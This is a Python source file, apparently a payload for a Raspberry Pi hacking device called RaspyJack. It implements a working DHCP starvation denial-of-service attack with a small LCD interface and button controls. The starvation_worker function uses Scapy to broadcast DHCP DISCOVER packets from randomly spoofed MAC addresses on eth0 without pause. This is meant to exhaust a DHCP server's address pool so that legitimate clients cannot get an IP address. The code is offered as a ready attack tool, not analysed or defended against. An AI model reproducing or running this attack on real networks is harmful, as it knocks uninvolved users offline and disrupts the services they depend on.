#!/usr/bin/env python3
"""
RaspyJack *payload* – **DHCP Starvation Attack (eth0)**
========================================================
A denial-of-service attack that floods the local network with DHCP
discover packets from spoofed MAC addresses. This can exhaust the IP
address pool of a DHCP server, preventing legitimate clients from
obtaining an IP address.

Features:
1.  Uses Scapy to craft and send DHCP DISCOVER packets.
2.  Randomizes the source MAC address for each packet.
3.  Runs the attack in a dedicated thread to keep the UI responsive.
4.  Displays the attack status and total packets sent on the LCD.
5.  Can be started and stopped by the user.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, threading, random
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    # Scapy can be noisy, disable verbose output
    conf.verb = 0
except ImportError:
    print("Scapy is not installed. Please run: pip install scapy", file=sys.stderr)
    sys.exit(1)

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
ETH_INTERFACE = "eth0"
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) Attack Functions
# ---------------------------------------------------------------------------
def generate_random_mac():
    """Generates a random MAC address."""
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                       random.randint(0, 255),
                                       random.randint(0, 255))

def starvation_worker():
    """Thread worker that crafts and sends DHCP discover packets."""
    global packet_count
    
    while not attack_stop_event.is_set():
        spoofed_mac = generate_random_mac()
        
        dhcp_discover = (
            Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=spoofed_mac) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        
        sendp(dhcp_discover, iface=ETH_INTERFACE, verbose=0)
        packet_count += 1
        time.sleep(0.05) # Small delay to prevent overwhelming the local CPU

def start_attack():
    global attack_thread, packet_count
    if attack_thread and attack_thread.is_alive():
        return

    packet_count = 0
    attack_stop_event.clear()
    attack_thread = threading.Thread(target=starvation_worker, daemon=True)
    attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

# ---------------------------------------------------------------------------
# 6) UI Functions
# ---------------------------------------------------------------------------
def draw_ui(status: str):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    d.text((5, 5), "DHCP Starvation (eth0)", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 35), status, font=FONT_STATUS, fill=status_color)

    d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
    d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")

    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    is_attacking = False
    
    # Check for eth0 connectivity and IP
    try:
        ip_output = subprocess.check_output(f"ip -o -4 addr show {ETH_INTERFACE}", shell=True).decode()
        link_output = subprocess.check_output(f"ip link show {ETH_INTERFACE}", shell=True).decode()
        
        if "NO-CARRIER" in link_output:
            draw_ui("eth0 Disconnected")
            time.sleep(3)
            raise SystemExit("Ethernet cable not connected.")
        
        if "state DOWN" in link_output:
            draw_ui("eth0 is DOWN!")
            time.sleep(3)
            raise SystemExit("Ethernet interface is down.")
            
        if "inet " not in ip_output:
            draw_ui("eth0 No IP!")
            time.sleep(3)
            raise SystemExit("Ethernet interface has no IP address.")
            
    except subprocess.CalledProcessError:
        draw_ui(f"eth0 not found!")
        time.sleep(3)
        raise SystemExit(f"Interface {ETH_INTERFACE} not found.")
    except Exception as e:
        draw_ui(f"eth0 check error!\n{str(e)[:20]}")
        time.sleep(3)
        raise SystemExit(f"Error checking {ETH_INTERFACE}: {e}")

    while running:
        draw_ui("ACTIVE" if is_attacking else "STOPPED")
        
        # Wait for button press, with a timeout to refresh UI
        start_wait = time.time()
        while time.time() - start_wait < 1.0:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                is_attacking = not is_attacking
                if is_attacking:
                    start_attack()
                else:
                    stop_attack()
                time.sleep(0.3) # Debounce
                break
            
            time.sleep(0.05)
        
        if not running:
            break

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("DHCP Starvation payload finished.")
